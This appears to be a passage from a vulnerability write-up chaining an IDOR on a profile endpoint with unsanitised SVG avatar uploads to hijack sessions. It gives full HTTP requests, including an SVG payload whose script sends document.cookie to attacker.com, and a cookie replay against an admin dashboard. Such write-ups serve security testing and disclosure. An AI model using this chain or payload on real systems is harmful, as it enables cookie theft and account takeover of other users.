Low bug #2 details

    Endpoint: PUT /api/v1/user/profile

    Issue: No check that user_id in body matches session user.

Low bug #3 details

    Endpoint: POST /api/v1/user/avatar (accepts .svg)

    Issue: No sanitization of SVG; no CSP on profile view.

Exploit chain
Step 1 – Attacker uploads malicious SVG as own avatar
http

POST /api/v1/user/avatar HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="evil.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
------WebKitFormBoundary--

Step 2 – Change victim’s avatar to attacker’s SVG using IDOR
http

PUT /api/v1/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_session>
Content-Type: application/json

{
  "user_id": "victim_456",
  "avatar_url": "/uploads/avatars/evil.svg"
}

Step 3 – Victim visits own profile

    GET /profile/victim_456 → loads SVG → script executes.

    Victim’s session cookie sent to attacker.

Step 4 – Attacker hijacks session
http

GET /api/v1/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=<victim_session_cookie>

✅ Result: Privilege escalation to admin if victim is admin.
